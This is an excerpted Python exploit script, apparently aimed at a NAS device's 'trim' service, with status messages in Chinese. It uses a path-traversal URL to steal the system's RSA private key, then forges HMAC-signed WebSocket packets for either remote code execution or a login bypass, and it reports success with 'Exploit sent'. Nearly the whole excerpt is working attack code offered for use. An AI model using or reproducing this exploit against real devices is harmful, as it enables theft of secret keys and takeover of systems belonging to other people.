...
class TrimProtocol:
    ...
    def __init__(self, url):
        self.root_aes_key = self._load_root_key(
            f"http://{url}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../usr/trim/etc/rsa_private_key.pem"
        )

    def _load_root_key(self, url):
        try:
            r = requests.get(url, timeout=5)
            r.raise_for_status()
        except Exception:
            print(f"❌ [Error] 找不到密钥文件: {url}")
            sys.exit(1)

        raw = r.content

        if len(raw) < 132:
            print(f"❌ [Error] 密钥文件长度异常: {len(raw)}")
            sys.exit(1)
    ...
    def sign_packet(self, payload_dict, hmac_key):
        ...
        signature = hmac.new(
            hmac_key, json_str.encode("utf-8"), hashlib.sha256
        ).digest()
...
class TrimAttacker:
    def __init__(self, mode, url, long_token=None):
        self.protocol = TrimProtocol(url)
        self.ws = None
        self.si = ""
        self.step = 0
        self.mode = mode  # 'rce' or 'login'
        self.long_token = long_token
        self.url = f"ws://{url}/websocket?type=main"
    ...
    def on_message(self, ws, message):
        try:
            ...
            if self.step == 2:
                ...
                elif self.mode == "rce" and (
                    data.get("result") == "succ" or data.get("errno") == 0
                ):
                    print(f"\n🎉 [2/2] Exploit 发送成功")
...
if __name__ == "__main__":
    ...
    attacker = None
    if args.command == "rce":
        attacker = TrimAttacker("rce", args.url)
    elif args.command == "login":
        attacker = TrimAttacker("login", args.url, long_token=args.token)
